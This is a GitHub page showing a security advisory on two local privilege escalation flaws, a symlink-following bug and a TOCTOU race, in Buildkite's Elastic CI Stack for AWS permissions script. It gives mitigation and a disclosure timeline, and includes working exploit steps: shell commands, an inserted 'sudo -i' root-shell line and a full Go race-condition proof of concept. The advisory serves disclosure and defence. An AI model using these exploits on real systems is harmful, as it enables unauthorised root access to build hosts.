
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fatredispartners%2Fadvisories%2Fblob%2Fmaster%2FATREDIS-2023-0003.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fatredispartners%2Fadvisories%2Fblob%2Fmaster%2FATREDIS-2023-0003.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=atredispartners%2Fadvisories)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[atredispartners](/atredispartners)
/
**[advisories](/atredispartners/advisories)**
Public

* [Notifications](/login?return_to=%2Fatredispartners%2Fadvisories) You must be signed in to change notification settings
* [Fork
  11](/login?return_to=%2Fatredispartners%2Fadvisories)
* [Star
   54](/login?return_to=%2Fatredispartners%2Fadvisories)

* [Code](/atredispartners/advisories)
* [Issues
  0](/atredispartners/advisories/issues)
* [Pull requests
  0](/atredispartners/advisories/pulls)
* [Actions](/atredispartners/advisories/actions)
* [Projects
  0](/atredispartners/advisories/projects)
* [Security](/atredispartners/advisories/security)
* [Insights](/atredispartners/advisories/pulse)

Additional navigation options

* [Code](/atredispartners/advisories)
* [Issues](/atredispartners/advisories/issues)
* [Pull requests](/atredispartners/advisories/pulls)
* [Actions](/atredispartners/advisories/actions)
* [Projects](/atredispartners/advisories/projects)
* [Security](/atredispartners/advisories/security)
* [Insights](/atredispartners/advisories/pulse)

## Files

 master
## Breadcrumbs

1. [advisories](/atredispartners/advisories/tree/master)
/
# ATREDIS-2023-0003.md

 Blame  Blame
## Latest commit

## History

[History](/atredispartners/advisories/commits/master/ATREDIS-2023-0003.md)270 lines (211 loc) · 10.1 KB master
## Breadcrumbs

1. [advisories](/atredispartners/advisories/tree/master)
/
# ATREDIS-2023-0003.md

Top
## File metadata and controls

* Preview
* Code
* Blame

270 lines (211 loc) · 10.1 KB[Raw](https://github.com/atredispartners/advisories/raw/refs/heads/master/ATREDIS-2023-0003.md)
# BuildKite - Elastic CI Stack for AWS Multiple Vulnerabilities

## Vendors

* BuildKite

## Affected Products

Elastic CI Stack for AWS versions prior to 6.7.1 and 5.22.5

## Summary

The `fix-buildkite-agent-builds-permissions` script is susceptible to multiple vulnerabilities when processing command-line arguments from the `buildite-agent` user, leading to local privilege escalation.

## Mitigation

Customers should upgrade to the version branch that addresses these vulnerabilities (6.7.1/5.22.5). Alternatively, customers should consider deploying a pre-bootstrap hook to prevent execution of `fix-buildkite-agent-builds-permissions` during a build.

## Credit

This issue was found by Nick Nam of Atredis Partners.

## References

* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43116>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43741>
* <https://github.com/buildkite/elastic-ci-stack-for-aws/releases/tag/v6.7.1>
* <https://github.com/buildkite/elastic-ci-stack-for-aws/releases/tag/v5.22.5>

## Report Timeline

* 2023-09-08: Atredis Partners sent an initial notification to vendor, requesting PGP key for security@buildkite.com to transmit Symbolic Link Following vulnerability details
* 2023-09-11: Vendor replies confirming that the vulnerability details can be sent to dev@buildkite.com instead.
* 2023-09-11: Atredis Partners transmits vulnerabilty details
* 2023-09-11: Buildkite confirms receipt of the vulnerability details
* 2023-09-13: Buildkite releases versions 6.7.0 and 5.22.4 on GitHub to address CVE-2023-43116
* 2023-09-13: Atredis Partners reports vulnerability to MITRE for CVE ID assignment
* 2023-09-14: Atredis Partners identifies and reports a TOCTOU vulnerability introduced in 6.7.0 and 5.22.4 to the vendor
* 2023-09-18: Atredis Partners provides a proof-of-concept demonstrating exploitation of the TOCTOU vulnerability
* 2023-09-19: Atredis Partners reports vulnerability to MITRE for CVE ID assignment
* 2023-09-20: Buildkite releases versions 6.7.1 and 5.22.5 on GitHub to address CVE-2023-43741
* 2023-12-08: Atredis Partners publishes advisory ATREDIS-2023-0003

## Technical Details

### CVE-2023-43116 - Symbolic Link Following

Buildkite Elastic CI Stack for AWS includes a shell script called `fix-buildkite-agent-builds-permissions` intended to recursively fix ownership for files and directories under `/var/lib/buildkite-agent/builds`:

```
...
# We know the builds path:
BUILDS_PATH="/var/lib/buildkite-agent/builds"

# And now we can reconstruct the full agent builds path:
PIPELINE_PATH="${BUILDS_PATH}/${AGENT_DIR}/${ORG_DIR}/${PIPELINE_DIR}"
# => "/var/lib/buildkite-agent/builds/my-agent-1/my-org/my-pipeline"

if [[ -e "${PIPELINE_PATH}" ]]; then
        /bin/chown -R buildkite-agent:buildkite-agent "${PIPELINE_PATH}"
fi
```

**packer/linux/conf/buildkite-agent/scripts/fix-buildkite-agent-builds-permissions**

Further, the script is permitted to be executed using `sudo` by the `buildite-agent` user through a `sudoers.conf` entry:

```
buildkite-agent ALL=NOPASSWD: /usr/bin/fix-buildkite-agent-builds-permissions

```

**packer/linux/conf/buildkite-agent/sudoers.conf**

However, all directories beneath `/var/lib/buildkite-agent/builds` are writeable by the `buildkite-agent` user by default. As a result, an attacker can create a symbolic link pointing to `/usr/bin/` in a subdirectory within `/var/lib/buildkite-agent/builds` and execute `fix-buildkite-agent-builds-permissions` to change ownership of itself to `buildkite-agent:buildkite-agent`:

```
# change directory to ${AGENT_DIR}
$ cd /var/lib/buildkite-agent/builds/buildkite-agent-default-stack-i-abcdef0123456789-1/

# create symlink to /usr/bin
$ ln -s /usr/bin usr_bin

# execute fix-buildkite-agent-builds-permissions to change ownership of itself
$ sudo /usr/bin/fix-buildkite-agent-builds-permissions buildkite-agent-default-stack-i-abcdef0123456789-1 usr_bin fix-buildkite-agent-builds-permissions

# verify that ownership changed to buildkite-agent:buildkite-agent
$ ls -alh /usr/bin/fix-buildkite-agent-builds-permissions
-rwxr-xr-x 1 buildkite-agent buildkite-agent 2.4K May 27  2022 /usr/bin/fix-buildkite-agent-builds-permissions
```

**Changing Ownership of `fix-buildkite-agent-builds-permissions`**

After changing ownership of `fix-buildkite-agent-builds-permissions`, it can be modified to run `sudo -i` to execute an interactive root shell:

```
...
# In here we need to check that they both don't contain slashes or contain a
# traversal component.

# *** INSERTED TO SPAWN INTERACTIVE ROOT SHELL ***
sudo -i
# *** INSERTED TO SPAWN INTERACTIVE ROOT SHELL ***

AGENT_DIR="$1"
# => "my-agent-1"

ORG_DIR="$2"
# => "my-org"
...
```

**packer/linux/conf/buildkite-agent/scripts/fix-buildkite-agent-builds-permissions**

When `sudo /usr/bin/fix-buildkite-agent-builds-permissions` is ran again, it executes an interactive root shell:

```
$ sudo /usr/bin/fix-buildkite-agent-builds-permissions
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Escalating to `root`**

### CVE-2023-43741 - Time-of-check Time-of-use (TOCTOU) Race Condition

Versions 6.7.0 and 5.22.4 addressed CVE-2023-43116 (Symbolic Link Following) through a check using `realpath` to identify any symbolic link segments in `PIPELINE_PATH` prior to changing ownership of `PIPELINE_PATH`.

```
...
# Check for symlink shenanigans
if [[ "$(realpath "${PIPELINE_PATH}")" != "${PIPELINE_PATH}" ]]; then
	exit 4
fi

# It should be a directory.
if [[ ! -d "${PIPELINE_PATH}" ]]; then
	exit 5
fi

# If we make it here, we're safe to go!

/bin/chown -R buildkite-agent:buildkite-agent "${PIPELINE_PATH}"
```

**packer/linux/conf/buildkite-agent/scripts/fix-buildkite-agent-builds-permissions**

This introduced a TOCTOU race condition allowing an attacker to effectively bypass the `realpath` check. To exploit this, an attacker could craft a `PIPELINE_PATH` directory that passes the `realpath` check and covert the directory to a symbolic link prior to the `/bin/chown` command. For example, this can be accomplished using the `SYS_RENAMEAT2` system call as shown in the following proof-of-concept:

```
package main

import (
    "fmt"
    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "syscall"
    "unsafe"
)

func main() {
    // check that current user is buildkite-agent
    username := "buildkite-agent"
    currentUser, err := user.Current()
    if err != nil {
        panic(err)
    }

    if username != currentUser.Username {
        fmt.Printf("Must be run as %s\n", username)
        return
    }

    // define directories, paths, and script file name
    usrBin := "/usr/bin/"
    scriptFile := "fix-buildkite-agent-builds-permissions"
    buildPath := "/var/lib/buildkite-agent/builds"
    agentDirectory := "agent_dir"
    orgDirectory := "org_dir"
    pipelineDirectory := scriptFile
    usrBinSymlink := "usr_bin"

    // mkdir -p /var/lib/buildkite-agent/builds/agent_dir/org_dir/fix-buildkite-agent-builds-permissions
    err = os.MkdirAll(filepath.Join(buildPath, agentDirectory, orgDirectory, pipelineDirectory), 0755)
    if err != nil {
        panic(err)
    }

    // ln -s /usr/bin/ /var/lib/buildkite-agent/builds/agent_dir/usr_bin
    err = os.Symlink(usrBin, filepath.Join(buildPath, agentDirectory, usrBinSymlink))
    if err != nil {
        panic(err)
    }

    // cd /var/lib/buildkite-agent/builds/agent_dir/
    err = os.Chdir(filepath.Join(buildPath, agentDirectory))
    if err != nil {
        panic(err)
    }

    // loop renameat2 to atomically exchange names between org_dir and usr_bin
    signal := AtomicNameExchanger(orgDirectory, usrBinSymlink)

    for {
        // sudo /usr/bin/fix-buildkite-agent-builds-permissions agent_dir usr_bin fix-buildkite-agent-builds-permissions
        cmd := exec.Command("sudo", filepath.Join(usrBin, scriptFile), agentDirectory, usrBinSymlink, scriptFile)
        _ = cmd.Run()

        // check ownership of /usr/bin/fix-buildkite-agent-builds-permissions
        var stat syscall.Stat_t
        err = syscall.Stat(filepath.Join(usrBin, scriptFile), &stat)
        if err != nil {
                panic(err)
        }

        // check if ownership changed
        if int(stat.Uid) == os.Getuid() {
                // success
                signal <- 0
                break
        }
    }

    // ownership changed
    fmt.Println("\n\nownership changed:")
    cmd := exec.Command("/bin/ls", "-lah", filepath.Join(usrBin, scriptFile))
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    _ = cmd.Run()
}

func AtomicNameExchanger(relativePath1, relativePath2 string) chan int {
    ch := make(chan int)
    const SYS_RENAMEAT2 = 316
    AT_FDCWD := -100
    RENAME_EXCHANGE := 2

    p1, _ := syscall.BytePtrFromString(relativePath1)
    p2, _ := syscall.BytePtrFromString(relativePath2)

    go func() {
        for {
            select {
            case <- ch:
                    fmt.Println("boom!")
                    return
            default:
                    fmt.Print(".")
                    _, _, _ = syscall.Syscall6(
                        SYS_RENAMEAT2,
                        uintptr(AT_FDCWD),
                        uintptr(unsafe.Pointer(p1)),
                        uintptr(AT_FDCWD),
                        uintptr(unsafe.Pointer(p2)),
                        uintptr(RENAME_EXCHANGE),
                        0)
            }
        }
    }()
    return ch
}
```

Succesful exploitation results in changing ownership of the `fix-buildkite-agent-builds-permissions` script to `buildkite-agent` which can then be modified and executed to escalate privileges as descibed in CVE-2023-43116 - Symbolic Link Following:

```
$ go run toctou-poc.go
..............................................................................................................
..............................................................................................................
..............................................................................................................
.........................................................................................boom!
ownership changed:
-rwxr-xr-x 1 buildkite-agent buildkite-agent 2.7K Sep 14 07:56 /usr/bin/fix-buildkite-agent-builds-permissions
```

**Changing Ownership of `fix-buildkite-agent-builds-permissions`**

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

